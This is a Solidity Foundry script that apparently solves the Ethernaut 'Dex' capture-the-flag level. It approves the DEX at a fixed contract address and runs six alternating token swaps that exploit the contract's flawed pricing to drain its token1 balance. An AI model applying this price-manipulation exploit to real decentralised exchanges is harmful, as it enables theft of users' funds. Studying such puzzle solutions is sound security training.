// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IDex {
    function approve(address spender, uint256 amount) external;
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function token1() external view returns(address);
    function token2() external view returns(address);
}
contract DexSolution is Script {
    IDex dex = IDex(0xE4079C22db87171C6c0246fBBB6f033ec5FA75A5);
    function run() external
    {
        vm.startBroadcast();
        dex.approve(address(dex), 500);
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);

        console.log("Dex Token1 balance: ", dex.balanceOf(token1, address(dex)));
        vm.stopBroadcast();
    }
}